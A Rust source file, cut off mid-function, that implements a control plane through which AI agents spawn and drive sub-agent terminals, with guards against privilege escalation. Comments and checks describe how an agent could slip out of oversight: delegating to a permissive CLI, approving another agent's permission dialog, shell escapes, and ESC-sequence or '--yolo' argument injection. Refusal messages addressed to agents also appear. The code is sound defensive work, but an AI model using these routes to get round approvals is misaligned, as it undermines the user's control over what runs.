//! Agent control plane — the hook server's `/ctl/*` endpoints, consumed by
//! `promptops ctl …` (cli/ctl.mjs).
//!
//! The legacy `/subagent/*` endpoints are fire-and-forget: they re-emit an
//! event to the renderer and answer `{ok:true}`, with no id or state. Here instead
//! every call is synchronous and returns JSON an agent can use:
//!
//!  - `POST /ctl/agent/list`   → sub-agents of the caller's parent + state
//!  - `POST /ctl/agent/spawn`  → direct `do_spawn`, returns the id
//!  - `POST /ctl/agent/get`    → state of one agent
//!  - `POST /ctl/agent/prompt` → paste + Enter (rejected if `blocked`)
//!  - `POST /ctl/agent/wait`   → sliced long-poll (max `WAIT_SLICE`)
//!  - `POST /ctl/agent/read`   → rendered screen (vt100) / last message
//!  - `POST /ctl/agent/keys`   → named keys or text without Enter
//!
//! Security — the caller is an LLM agent, so input is NOT trusted:
//!  - per-process token (`PROMPTOPS_CTL_TOKEN`, injected only into PromptOps
//!    PTYs), checked by `hook.rs` BEFORE reading the body; requests
//!    originating in a browser (`Origin`) or with a non-local `Host` are rejected;
//!  - scope: the caller (`PROMPTOPS_SESSION_ID`) sees and drives ONLY the
//!    sub-agents of its own parent; an id that is not a live session or
//!    sub-agent is refused (`unknown_caller`);
//!  - `ctl.json` (for MCP clients that clear the env) holds a second token
//!    that drives agents but cannot read the saved API key
//!    (`/ctl/cli/llm-key` wants the terminal token);
//!  - a `blocked` agent (permission dialog) receives no input from ctl: the
//!    decision stays with the user or the auto-approve layer, never another agent;
//!  - NO authority beyond what the user granted. As long as the
//!    session is not in auto-approve ("attended") ctl cannot: open raw
//!    shells, pick a mode that loosens permissions, leave the workspace,
//!    write to a PTY where the text would be executed (`!cmd`, slash
//!    command, visible shell), send text/Enter as keys, or prompt an
//!    agent whose state is not `idle` as certified by hooks (a dialog
//!    could open under the paste). With auto-approve on, the user has
//!    already delegated unattended execution and these limits drop;
//!  - `provider` is an allowlist: a free-form id would end up in the shell line;
//!  - text is stripped of control characters: an ESC would close the
//!    bracketed paste and the rest would be typed as keys;
//!  - per-parent rate caps (spawn, prompt, keys);
//!  - prompts via ctl credit the prompt counter, but at most
//!    `CREDIT_MAX` per `CREDIT_WINDOW` across the whole app, so an agent loop
//!    cannot inflate it.
//!
//! State authority: Claude Code hooks from the children (which `hook.rs`
//! drops for the noise-leak) feed `note_hook`; for providers without hooks
//! we fall back to PTY activity (buffer growth).

use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, OnceLock};
use std::time::{Duration, Instant};

use parking_lot::Mutex;
use serde_json::{json, Value};
use tauri::{AppHandle, Manager};

use crate::commands::subagent::{
    SpawnSubAgentRequest, SubAgentManager, SubAgentStatus, SubAgentView,
};

/// Env var through which the token reaches the PTYs (see `promptops_cli::apply_env`).
pub const TOKEN_ENV: &str = "PROMPTOPS_CTL_TOKEN";

/// Maximum duration of a single `wait` request: the client polls again. Below
/// undici's 300 s headersTimeout (Node fetch), with margin.
const WAIT_SLICE: Duration = Duration::from_secs(45);
const WAIT_TICK: Duration = Duration::from_millis(250);
/// PTY silence after which an agent without hooks is considered `idle`.
const ACTIVITY_QUIET: Duration = Duration::from_millis(2500);
/// Activity sampling window for one-shot reads.
const ACTIVITY_SAMPLE: Duration = Duration::from_millis(400);
/// Cap on live sub-agents per parent that ctl can create (anti fork-bomb).
const MAX_LIVE_PER_PARENT: usize = 12;
const MAX_PROMPT_BYTES: usize = 256 * 1024;
const READ_SCROLLBACK: usize = 4000;
const MAX_NAME_CHARS: usize = 80;

/// Providers ctl can launch: known agent CLIs only. A free-form id would end up
/// verbatim in the PTY's shell line (`provider_binary`).
const AGENT_PROVIDERS: &[&str] = &[
    "claude-code-cli",
    "zai",
    "kimi",
    "codex",
    "gemini-cli",
    "antigravity",
    "copilot",
    "cursor",
    "grok",
    "hermes",
    "opencode",
    "muse",
    "promptops-cli",
];
/// Providers whose CLI, by default, asks for confirmation before writing files or
/// running commands (or confines them in a sandbox). Only these can be launched
/// in an attended session: for the others the default is not guaranteed, and an
/// agent could delegate to a permissive CLI what it is not allowed to do itself.
const GATED_PROVIDERS: &[&str] = &[
    "claude-code-cli",
    "zai",
    "kimi",
    "codex",
    "gemini-cli",
    "antigravity",
    "copilot",
    "cursor",
    "muse",
    "promptops-cli",
];
/// Raw shell: the "prompt" is a command executed without any permission.
const RAW_SHELL: &str = "generic-shell";
/// Slash commands allowed in an attended session (they don't touch permissions, config,
/// accounts, hooks or folders).
const SAFE_SLASH: &[&str] = &["/clear", "/compact"];
/// Keys allowed in an attended session: interrupt, clear, scroll. Never
/// Enter, Tab, Shift+Tab (changes the permission mode) or text: they could
/// answer a dialog or submit a draft.
const ATTENDED_KEYS: &[&str] = &[
    "esc",
    "ctrl+c",
    "ctrl+l",
    "ctrl+u",
    "backspace",
    "up",
    "down",
    "left",
    "right",
    "home",
    "end",
    "pageup",
    "pagedown",
];

const RATE_WINDOW: Duration = Duration::from_secs(600);
const MAX_SPAWNS_PER_WINDOW: usize = 20;
const MAX_PROMPTS_PER_WINDOW: usize = 60;
const MAX_KEYS_PER_WINDOW: usize = 600;
const MAX_BENCH_PER_WINDOW: usize = 60;
/// Prompt-counter credit for prompts via ctl: at most `CREDIT_MAX` per
/// `CREDIT_WINDOW`, app-wide.
const CREDIT_WINDOW: Duration = Duration::from_secs(300);
const CREDIT_MAX: usize = 5;

#[derive(Clone, Copy, PartialEq, Eq)]
enum Phase {
    Working,
    Idle,
    Blocked,
}

struct Lifecycle {
    phase: Phase,
    /// `last_assistant_message` of the last Stop.
    last_message: Option<String>,
    /// Completed turns (Stops received): `wait --since-turn` waits for the increment.
    turns: u64,
}

static TOKEN: OnceLock<String> = OnceLock::new();
/// Second per-process token, written to `ctl.json` for MCP clients that start
/// their servers with a cleared environment (Codex). A file is readable by any
/// process of the user, not only by PromptOps terminals: this token drives
/// agents but never reads the saved API key (`/ctl/cli/llm-key`).
static FILE_TOKEN: OnceLock<String> = OnceLock::new();
static LIFECYCLE: OnceLock<Mutex<HashMap<String, Lifecycle>>> = OnceLock::new();
/// Sliding rate-limit windows keyed by (scope, kind).
type RateWindows = HashMap<(String, &'static str), VecDeque<Instant>>;
static RATES: OnceLock<Mutex<RateWindows>> = OnceLock::new();

/// Sliding window: `true` and records the event if under the cap.
fn window_allows(
    events: &mut VecDeque<Instant>,
    now: Instant,
    max: usize,
    window: Duration,
) -> bool {
    while events
        .front()
        .is_some_and(|t| now.duration_since(*t) >= window)
    {
        events.pop_front();
    }
    if events.len() >= max {
        return false;
    }
    events.push_back(now);
    true
}

fn rate_allows(scope: &str, kind: &'static str, max: usize, window: Duration) -> bool {
    let mut rates = RATES.get_or_init(|| Mutex::new(HashMap::new())).lock();
    let now = Instant::now();
    // Keys are session ids: queues that are now empty get cleaned up.
    rates.retain(|_, events| {
        events
            .back()
            .is_some_and(|t| now.duration_since(*t) < RATE_WINDOW)
    });
    window_allows(
        rates.entry((scope.to_string(), kind)).or_default(),
        now,
        max,
        window,
    )
}

/// Can a prompt delivered by ctl count toward the prompt counter? A single
/// cap for the app: an agent loop never inflates it.
fn credit_allowed() -> bool {
    rate_allows("*", "credit", CREDIT_MAX, CREDIT_WINDOW)
}

// ── Policy (pure functions: untrusted input → decision) ──────────────

/// Policy rejection: (code, message) → `403 Forbidden`.
type Denied = (&'static str, String);

const ATTENDED_HINT: &str = "allowed only in sessions where the user enabled auto-approve; tell the user instead of working around it";

/// Text meant for a bracketed paste: strip ESC and every other control (an
/// `ESC[201~` would close the paste and the rest would be TYPED), `\r` → `\n`.
fn clean_text(raw: &str) -> String {
    raw.replace("\r\n", "\n")
        .chars()
        .map(|c| if c == '\r' { '\n' } else { c })
        .filter(|c| *c == '\n' || *c == '\t' || !c.is_control())
        .collect()
}

/// Single-line label (title): no controls, limited length.
fn clean_label(raw: &str) -> String {
    let flat: String = raw
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    flat.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .chars()
        .take(MAX_NAME_CHARS)
        .collect()
}

/// Opaque identifier (role, mode): lowercase, digits, `-`, `_`.
fn safe_ident(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 40
        && value
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-' || b == b'_')
}

/// `session_provider`: the provider of the caller's session. Launching the
/// SAME CLI the user already chose for the session adds no authority.
fn check_provider(
    provider: &str,
    session_provider: Option<&str>,
    unattended: bool,
) -> Result<(), Denied> {
    if AGENT_PROVIDERS.contains(&provider) {
        if unattended || GATED_PROVIDERS.contains(&provider) || session_provider == Some(provider) {
            return Ok(());
        }
        return Err(("provider_needs_auto_approve", format!("'{provider}' is not known to ask before running tools (accepted here: {}): {ATTENDED_HINT}", GATED_PROVIDERS.join(", "))));
    }
    if provider == RAW_SHELL {
        return if unattended {
            Ok(())
        } else {
            Err((
                "shell_provider_forbidden",
                format!(
                    "a raw shell runs its prompt as a command with no approval: {ATTENDED_HINT}"
                ),
            ))
        };
    }
    Err((
        "provider_not_allowed",
        format!("unknown provider; allowed: {}", AGENT_PROVIDERS.join(", ")),
    ))
}

/// In an attended session the text must not become a CLI command:
/// `!cmd` is bash mode (direct execution), `/cmd` a slash command.
fn check_prompt_prefix(text: &str) -> Result<(), Denied> {
    let head = text.trim_start();
    if head.starts_with('!') {
        return Err(("shell_escape_forbidden", format!("a prompt starting with '!' runs as a shell command in the agent's CLI: {ATTENDED_HINT}")));
    }
    if head.starts_with('/') {
        let command = head.split_whitespace().next().unwrap_or("");
        if !SAFE_SLASH.contains(&command) {
            return Err(("slash_command_forbidden", format!("a prompt starting with '/' runs as a CLI command (only {} are accepted here); start with a word, or: {ATTENDED_HINT}", SAFE_SLASH.join(", "))));
        }
    }
    Ok(())
}

/// Requested `cwd` → canonical path of an existing folder; in an attended
/// session it must be inside the parent's workspace.
fn check_cwd(cwd: &str, workspace: Option<&str>, unattended: bool) -> Result<String, Denied> {
    let invalid = || {
        (
            "invalid_cwd",
            "cwd must be an existing local directory (absolute path)".to_string(),
        )
    };
    let path = std::path::Path::new(cwd);
    if !path.is_absolute() {
        return Err(invalid());
    }
    let real = std::fs::canonicalize(path).map_err(|_| invalid())?;
    if !real.is_dir() {
        return Err(invalid());
    }
    if !unattended {
        let inside = workspace
            .and_then(|w| std::fs::canonicalize(w).ok())
            .is_some_and(|root| real.starts_with(&root));
        if !inside {
            return Err((
                "cwd_outside_workspace",
                format!("cwd must be inside the session workspace: {ATTENDED_HINT}"),
            ));
        }
    }
    Ok(real.to_string_lossy().into_owned())
}

fn check_keys(names: &[&str], has_text: bool, unattended: bool) -> Result<(), Denied> {
    if unattended {
        return Ok(());
    }
    if has_text {
        return Err(("text_forbidden", format!("literal text through keys could answer a dialog or build a command; use prompt, or: {ATTENDED_HINT}")));
    }
    if let Some(name) = names.iter().find(|name| !ATTENDED_KEYS.contains(name)) {
        return Err(("key_forbidden", format!("'{name}' could submit input, answer a dialog or change the permission mode (accepted here: {}): {ATTENDED_HINT}", ATTENDED_KEYS.join(" "))));
    }
    Ok(())
}

fn denied((code, message): Denied) -> Reply {
    fail("403 Forbidden", code, message)
}

fn rate_limited(what: &str) -> Reply {
    fail("429 Too Many Requests", "rate_limited", format!("too many {what} from this session in the last 10 minutes; slow down and report to the user"))
}

fn lifecycle() -> &'static Mutex<HashMap<String, Lifecycle>> {
    LIFECYCLE.get_or_init(|| Mutex::new(HashMap::new()))
}

/// Control plane token, generated on first use and valid for the lifetime of the
/// process (PTYs already open keep it in their env).
pub fn token() -> &'static str {
    TOKEN.get_or_init(|| {
        format!(
            "{}{}",
            uuid::Uuid::new_v4().simple(),
            uuid::Uuid::new_v4().simple()
        )
    })
}

/// Token for `ctl.json` (see [`FILE_TOKEN`]).
pub fn file_token() -> &'static str {
    FILE_TOKEN.get_or_init(|| {
        format!(
            "{}{}",
            uuid::Uuid::new_v4().simple(),
            uuid::Uuid::new_v4().simple()
        )
    })
}

/// Which credential a request carries: the terminal token (env of PromptOps
/// PTYs only) or the `ctl.json` one.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Credential {
    Terminal,
    File,
}

fn credential(given: &str) -> Option<Credential> {
    if token_matches(given) {
        Some(Credential::Terminal)
    } else if constant_time_eq(file_token().as_bytes(), given.as_bytes()) {
        Some(Credential::File)
    } else {
        None
    }
}

/// Hook from a sub-agent child session (called by `dispatch_hook_event`
/// before it is dropped): the only Rust-side lifecycle source for those children.
pub fn note_hook(session_id: &str, event_name: &str, event: &Value) {
    if session_id.is_empty() {
        return;
    }
    let mut map = lifecycle().lock();
    if event_name == "SessionEnd" {
        map.remove(session_id);
        return;
    }
    let phase = match event_name {
        "UserPromptSubmit" | "PreToolUse" | "PostToolUse" => Phase::Working,
        "Stop" => Phase::Idle,
        "Notification" => {
            match event
                .get("notification_type")
                .and_then(|v| v.as_str())
                .unwrap_or("")
            {
                "permission_prompt" | "elicitation_dialog" => Phase::Blocked,
                // idle_prompt = "waiting for input" after a completed turn.
                "idle_prompt" => Phase::Idle,
                _ => return,
            }
        }
        _ => return,
    };
    let entry = map.entry(session_id.to_string()).or_insert(Lifecycle {
        phase,
        last_message: None,
        turns: 0,
    });
    entry.phase = phase;
    if event_name == "Stop" {
        entry.turns += 1;
        entry.last_message = event
            .get("last_assistant_message")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_string);
    }
}

// ── Replies ──────────────────────────────────────────────────────────

type Reply = (&'static str, Value);

fn ok(result: Value) -> Reply {
    ("200 OK", json!({ "ok": true, "result": result }))
}

fn fail(status: &'static str, code: &str, message: impl Into<String>) -> Reply {
    (
        status,
        json!({ "ok": false, "error": { "code": code, "message": message.into() } }),
    )
}

/// Token check for `hook.rs`, which runs it BEFORE reading the body.
pub fn authorized(given: &str) -> bool {
    credential(given).is_some()
}

/// Terminal token only (hook events, `/subagent/*`): the `ctl.json` file
/// token is for the MCP server's `/ctl/*` calls.
pub fn authorized_terminal(given: &str) -> bool {
    credential(given) == Some(Credential::Terminal)
}

fn token_matches(given: &str) -> bool {
    constant_time_eq(token().as_bytes(), given.as_bytes())
}

fn constant_time_eq(expected: &[u8], given: &[u8]) -> bool {
    if given.len() != expected.len() {
        return false;
    }
    expected
        .iter()
        .zip(given)
        .fold(0u8, |acc, (a, b)| acc | (a ^ b))
        == 0
}

/// Scope of a caller: the parent session whose agents it may see and drive.
/// A sub-agent resolves to its parent; a main session to itself. Anything
/// else (a made-up id, a closed session) has no scope: `None`.
fn caller_scope(
    caller: &str,
    sub_agent_parent: Option<String>,
    is_session: bool,
) -> Option<String> {
    sub_agent_parent.or_else(|| is_session.then(|| caller.to_string()))
}

/// `model` reaches the provider's command line as the value of `--model`/`-m`:
/// the same character set the launch builder accepts, and never a value that
/// starts with `-` (yargs-based CLIs would read `-m --yolo` as a flag).
fn safe_model(model: &str) -> bool {
    !model.is_empty()
        && model.len() <= 64
        && !model.starts_with('-')
        && model
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '-' | '/'))
}

// ── Entry point (dedicated thread per connection, see hook.rs) ───────

pub fn handle(app: &AppHandle, method: &str, url: &str, body: &str, header_token: &str) -> Reply {
    let Some(credential) = credential(header_token) else {
        return fail(
            "401 Unauthorized",
            "unauthorized",
            "missing or invalid control token",
        );
    };
    if method != "POST" {
        return fail("405 Method Not Allowed", "invalid_request", "POST required");
    }
    let payload: Value = match serde_json::from_str(body) {
        Ok(v @ Value::Object(_)) => v,
        _ => {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "JSON object body required",
            )
        }
    };
    let caller = text(&payload, "caller");
    if caller.is_empty() {
        return fail(
            "400 Bad Request",
            "invalid_request",
            "caller (PROMPTOPS_SESSION_ID) required",
        );
    }
    let subs = app.state::<Arc<SubAgentManager>>().inner().clone();
    // A calling sub-agent resolves to its parent: all its peers are siblings.
    // An id that is neither a sub-agent nor a live session gets nothing.
    let is_session = app
        .state::<Arc<crate::commands::session::SessionManager>>()
        .has_session(&caller);
    let Some(parent) = caller_scope(&caller, subs.resolve_parent_session(&caller), is_session)
    else {
        return fail(
            "403 Forbidden",
            "unknown_caller",
            "caller is not a live PromptOps session or agent",
        );
    };
    let ctx = Ctx {
        app,
        subs,
        parent,
        caller,
    };

    match url.split('?').next().unwrap_or("") {
        "/ctl/agent/list" => ctx.list(),
        "/ctl/agent/spawn" => ctx.spawn(&payload),
        "/ctl/agent/get" => ctx.get(&payload),
        "/ctl/agent/prompt" => ctx.prompt(&payload),
        "/ctl/agent/wait" => ctx.wait(&payload),
        "/ctl/agent/read" => ctx.read(&payload),
        "/ctl/agent/keys" => ctx.keys(&payload),
        "/ctl/agent/move" => ctx.move_to_session(&payload),
        "/ctl/agent/bench" => ctx.bench(&payload),
        "/ctl/cli/llm-key" => cli_llm_key(credential),
        _ => fail("404 Not Found", "not_found", "unknown control endpoint"),
    }
}

/// The PromptOps CLI API key saved in the app (encrypted local store), for
/// the `promptops` CLI in a PromptOps terminal: the key never sits in a file
/// or in the terminal environment. Only the terminal token reads it: the
/// `ctl.json` token is on disk, where any process of the user can read it.
fn cli_llm_key(credential: Credential) -> Reply {
    if credential != Credential::Terminal {
        return denied((
            "terminal_token_required",
            "the saved API key is given only to the PromptOps CLI running in a PromptOps terminal"
                .into(),
        ));
    }
    ok(json!({ "apiKey": super::assets_ext::fcc_saved_api_key() }))
}

struct Ctx<'a> {
    app: &'a AppHandle,
    subs: Arc<SubAgentManager>,
    parent: String,
    caller: String,
}

impl Ctx<'_> {
    fn list(&self) -> Reply {
        let agents: Vec<Value> = self
            .subs
            .ctl_views(&self.parent)
            .iter()
            .map(|view| self.describe(view, false))
            .collect();
        ok(json!({ "parentSessionId": self.parent, "agents": agents }))
    }

    fn spawn(&self, payload: &Value) -> Reply {
        let prompt = clean_text(&text(payload, "prompt"));
        if prompt.trim().is_empty() {
            return fail("400 Bad Request", "invalid_request", "prompt required");
        }
        if prompt.len() > MAX_PROMPT_BYTES {
            return fail("400 Bad Request", "invalid_request", "prompt too large");
        }
        let parent = self.parent_info();
        let unattended = self.unattended();
        // Effective provider decided HERE and passed explicitly to `do_spawn`: what
        // gets validated is exactly what gets launched.
        let session_provider = parent.as_ref().and_then(|p| p.provider.clone());
        let provider = opt(payload, "provider")
            .or_else(|| session_provider.clone())
            .unwrap_or_else(|| "claude-code-cli".into());
        if let Err(no) = check_provider(&provider, session_provider.as_deref(), unattended) {
            return denied(no);
        }
        let role = Some(text(payload, "role"))
            .filter(|r| safe_ident(r))
            .unwrap_or_else(|| "custom".into());
        let model = opt(payload, "model");
        if model.as_deref().is_some_and(|m| !safe_model(m)) {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "model must be a model id (letters, digits, '.', '_', ':', '-', '/'; not starting with '-')",
            );
        }
        let effort = opt(payload, "effort");
        if effort
            .as_deref()
            .is_some_and(|e| !matches!(e, "low" | "medium" | "high" | "xhigh" | "max"))
        {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "effort must be low, medium, high, xhigh or max",
            );
        }
        let mode = opt(payload, "mode");
        if mode.as_deref().is_some_and(|m| !safe_ident(m)) {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "mode must be a mode id (lowercase letters, digits, '-', '_')",
            );
        }
        if !unattended {
            // A mode can translate to `--permission-mode acceptEdits`: an agent
            // does not pick for another one permissions wider than its own.
            let effective = mode.clone().unwrap_or_else(|| {
                crate::commands::subagent_modes::default_mode_for_role(&role).to_string()
            });
            let config = crate::commands::subagent_modes::resolve_config(&effective, None);
            if crate::commands::subagent_modes::build_native_mode_flags(&config, &provider)
                .contains("acceptEdits")
            {
                return denied((
                    "mode_forbidden",
                    format!("mode '{effective}' auto-accepts file edits: {ATTENDED_HINT}"),
                ));
            }
        }
        let cwd = match opt(payload, "cwd") {
            Some(cwd) => match check_cwd(
                &cwd,
                parent.as_ref().and_then(|p| p.workspace_path.as_deref()),
                unattended,
            ) {
                Ok(real) => Some(real),
                Err(no) => return denied(no),
            },
            None => None,
        };
        if self.subs.alive_count(&self.parent) >= MAX_LIVE_PER_PARENT {
            return fail(
                "409 Conflict",
                "agent_limit",
                format!("at most {MAX_LIVE_PER_PARENT} live agents per session"),
            );
        }
        let title = Some(clean_label(&text(payload, "name")))
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| "agent".into());
        if self
            .subs
            .ctl_views(&self.parent)
            .iter()
            .any(|v| is_live(v) && slug(&v.title) == slug(&title))
        {
            return fail(
                "409 Conflict",
                "name_taken",
                format!("a live agent is already named '{title}'"),
            );
        }
        if !rate_allows(&self.parent, "spawn", MAX_SPAWNS_PER_WINDOW, RATE_WINDOW) {
            return rate_limited("spawns");
        }
        // Only these fields: no executionMode/goalSpec/customConfig/account
        // from the caller (headless workers and free-form configs stay with the UI).
        let mut request: SpawnSubAgentRequest = match serde_json::from_value(json!({
            "parentSessionId": self.parent,
            "role": role,
            "title": title,
            "prompt": prompt,
            "provider": provider,
            "model": model,
            "effort": effort,
            "mode": mode,
            "workspaceOverride": cwd,
        })) {
            Ok(r) => r,
            Err(e) => return fail("400 Bad Request", "invalid_request", e.to_string()),
        };
        request.credit_prompt = Some(credit_allowed());
        match crate::commands::subagent::do_spawn(self.app, &self.subs, request) {
            Ok(view) => ok(json!({ "agent": self.describe(&view, false) })),
            Err(e) => fail("409 Conflict", "spawn_failed", e),
        }
    }

    fn get(&self, payload: &Value) -> Reply {
        match self.target(payload) {
            Ok(view) => ok(json!({ "agent": self.describe(&view, true) })),
            Err(reply) => reply,
        }
    }

    fn prompt(&self, payload: &Value) -> Reply {
        let view = match self.target(payload) {
            Ok(v) => v,
            Err(reply) => return reply,
        };
        let prompt = clean_text(&text(payload, "text"));
        if prompt.trim().is_empty() {
            return fail("400 Bad Request", "invalid_request", "text required");
        }
        if prompt.len() > MAX_PROMPT_BYTES {
            return fail("400 Bad Request", "invalid_request", "text too large");
        }
        if self.is_self(&view) {
            return fail(
                "409 Conflict",
                "self_target",
                "an agent cannot prompt itself",
            );
        }
        let (state, authority) = self.state_of(&view, true);
        match state {
            "blocked" => {
                return fail(
                    "409 Conflict",
                    "agent_blocked",
                    "agent is waiting on a permission/question dialog; no input was sent",
                )
            }
            "exited" | "error" => {
                return fail(
                    "409 Conflict",
                    "agent_exited",
                    "agent is not running; no input was sent",
                )
            }
            "starting" => {
                return fail(
                    "409 Conflict",
                    "agent_not_ready",
                    "agent is still starting; wait for idle first",
                )
            }
            _ => {}
        }
        if !self.unattended() {
            // Paste + Enter on a PTY where the text is EXECUTED, or where a
            // permission dialog may be (or appear) under the paste,
            // would be an approval given by an agent instead of the user.
            if self.subs.ctl_is_raw_shell(&view.id) {
                return denied(("shell_target_forbidden", format!("the target is a raw shell (or its CLI exited): text would run as commands; {ATTENDED_HINT}")));
            }
            if authority != "hooks" {
                return denied(("approval_state_unknown", format!("this agent's provider does not report permission dialogs reliably, so input could answer one; {ATTENDED_HINT}")));
            }
            if state != "idle" {
                return fail("409 Conflict", "agent_busy", "agent is mid-turn and a permission dialog could open under the input; wait for idle, then prompt");
            }
            if let Err(no) = check_prompt_prefix(&prompt) {
                return denied(no);
            }
        }
        if !rate_allows(&self.parent, "prompt", MAX_PROMPTS_PER_WINDOW, RATE_WINDOW) {
            return rate_limited("prompts");
        }
        let since_turn = self.turns(&view);
        if let Err(e) = self
            .subs
            .ctl_prompt(self.app, &view.id, &prompt, credit_allowed())
        {
            return fail("409 Conflict", "prompt_failed", e);
        }
        // Without waiting for UserPromptSubmit: an immediate `wait` must not
        // read the `idle` of the previous turn.
        if let Some(entry) = lifecycle().lock().get_mut(&view.session_id) {
            entry.phase = Phase::Working;
        }
        ok(json!({ "agent": self.describe(&view, false), "sinceTurn": since_turn }))
    }

    /// One wait slice. `until`: `settled` (default: idle|blocked|exited|
    /// error), `idle` (blocked/exited → error, never an endless wait), `blocked`.
    /// Returns `pending:true` when the slice expires: the client calls again.
    fn wait(&self, payload: &Value) -> Reply {
        let view = match self.target(payload) {
            Ok(v) => v,
            Err(reply) => return reply,
        };
        let until = Some(text(payload, "until"))
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| "settled".into());
        if !matches!(until.as_str(), "settled" | "idle" | "blocked") {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "until must be settled, idle or blocked",
            );
        }
        let since_turn = payload.get("sinceTurn").and_then(|v| v.as_u64());
        let slice = payload
            .get("sliceMs")
            .and_then(|v| v.as_u64())
            .map(Duration::from_millis)
            .unwrap_or(WAIT_SLICE)
            .min(WAIT_SLICE);

        let started = Instant::now();
        let mut last_total = self.subs.ctl_buffer_total(&view.id);
        let mut last_growth = Instant::now();
        loop {
            let Some(current) = self.subs.ctl_view(&view.id) else {
                return fail(
                    "404 Not Found",
                    "agent_not_found",
                    "agent was closed while waiting",
                );
            };
            let total = self.subs.ctl_buffer_total(&view.id);
            if total != last_total {
                last_total = total;
                last_growth = Instant::now();
            }
            let quiet = last_growth.elapsed() >= ACTIVITY_QUIET;
            let (mut state, authority) = self.state_with_activity(&current, !quiet);
            // With hooks, `idle` only counts once a turn completes AFTER the prompt.
            if state == "idle" && authority == "hooks" {
                if let Some(since) = since_turn {
                    if self.turns(&current) <= since {
                        state = "working";
                    }
                }
            }
            let settled = matches!(state, "idle" | "blocked" | "exited" | "error");
            let done = match until.as_str() {
                "idle" => state == "idle",
                "blocked" => state == "blocked",
                _ => settled,
            };
            if done {
                return ok(
                    json!({ "pending": false, "agent": self.describe_as(&current, state, authority, true) }),
                );
            }
            if settled && until != "settled" {
                // Waiting for idle but it is blocked/exited (or vice versa): it won't unblock by itself.
                let code = if state == "blocked" {
                    "agent_blocked"
                } else if state == "idle" {
                    "agent_idle"
                } else {
                    "agent_exited"
                };
                return fail(
                    "409 Conflict",
                    code,
                    format!("agent settled as '{state}' while waiting for '{until}'"),
                );
            }
            if started.elapsed() >= slice {
                return ok(
                    json!({ "pending": true, "agent": self.describe_as(&current, state, authority, false) }),
                );
            }
            std::thread::sleep(WAIT_TICK);
        }
    }

    fn read(&self, payload: &Value) -> Reply {
        let view = match self.target(payload) {
            Ok(v) => v,
            Err(reply) => return reply,
        };
        let source = Some(text(payload, "source"))
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| "recent".into());
        if source == "last-message" {
            let message = lifecycle()
                .lock()
                .get(&view.session_id)
                .and_then(|l| l.last_message.clone());
            return match message {
                Some(text) => ok(json!({ "source": source, "text": text })),
                None => fail(
                    "409 Conflict",
                    "no_last_message",
                    "no completed turn reported by hooks yet (only hook-enabled providers expose it)",
                ),
            };
        }
        if !matches!(source.as_str(), "recent" | "screen") {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "source must be recent, screen or last-message",
            );
        }
        let lines = payload
            .get("lines")
            .and_then(|v| v.as_u64())
            .unwrap_or(80)
            .clamp(1, 2000) as usize;
        let Some((raw, cols, rows)) = self.subs.ctl_screen(&view.id) else {
            return fail(
                "409 Conflict",
                "no_terminal",
                "agent has no terminal to read",
            );
        };
        let text = render_screen(&raw, cols, rows, source == "recent", lines);
        ok(json!({ "source": source, "text": text, "cols": cols, "rows": rows }))
    }

    fn keys(&self, payload: &Value) -> Reply {
        let view = match self.target(payload) {
            Ok(v) => v,
            Err(reply) => return reply,
        };
        if self.is_self(&view) {
            return fail(
                "409 Conflict",
                "self_target",
                "an agent cannot send keys to itself",
            );
        }
        // Answering a permission dialog is the user's decision (or the
        // auto-approve layer's): an agent does not approve another agent's commands.
        if self.state_of(&view, true).0 == "blocked" {
            return fail(
                "409 Conflict",
                "agent_blocked",
                "agent is waiting on a permission/question dialog; approvals stay with the user",
            );
        }
        let mut data = String::new();
        let literal = payload.get("text").and_then(|v| v.as_str()).unwrap_or("");
        // ESC and the other controls are keys (Shift+Tab = `ESC[Z`): they pass
        // only as named keys, never inside literal text.
        if literal.chars().any(char::is_control) {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "text must not contain newlines or control characters; use prompt to submit",
            );
        }
        let names: Vec<&str> = payload
            .get("keys")
            .and_then(|v| v.as_array())
            .into_iter()
            .flatten()
            .map(|key| key.as_str().unwrap_or(""))
            .collect();
        if let Err(no) = check_keys(&names, !literal.is_empty(), self.unattended()) {
            return denied(no);
        }
        if !rate_allows(&self.parent, "keys", MAX_KEYS_PER_WINDOW, RATE_WINDOW) {
            return rate_limited("key calls");
        }
        data.push_str(literal);
        for name in names {
            match key_bytes(name) {
                Some(bytes) => data.push_str(bytes),
                None => {
                    return fail(
                        "400 Bad Request",
                        "invalid_request",
                        format!("unknown key '{name}'"),
                    )
                }
            }
        }
        if data.is_empty() {
            return fail(
                "400 Bad Request",
                "invalid_request",
                "keys or text required",
            );
        }
        match self.subs.write_to(&view.id, &data, false) {
            Ok(()) => ok(json!({ "agent": self.describe(&view, false) })),
            Err(e) => fail("409 Conflict", "write_failed", e),
        }
    }

    // ── Helper ───────────────────────────────────────────────────────

    /// Resolves `target` (id, id prefix ≥ 6, name) WITHIN the parent's scope.
    /// Moves an agent to a NEW session with the given name: the UI creates the
    /// session (same provider/workspace) resuming the agent's conversation,
    /// closes the sub-agent and opens the session. Here we only validate and
    /// notify: creation needs the renderer's Channels.
    /// Without `target` the agent is the caller itself ("move me").
    fn move_to_session(&self, payload: &Value) -> Reply {
        let name = clean_label(&text(payload, "name"));
        if name.trim().is_empty() {
            return fail(
                "400 Bad Request",
                "name_required",
                "name of the new session required: ask the user",
            );
        }
        let view = if text(payload, "target").is_empty() {
            match self.subs.ctl_views(&self.parent).into_iter().find(|v| self.is_self(v)) {
                Some(view) => view,
                None => {
                    return fail(
                        "409 Conflict",
                        "not_a_subagent",
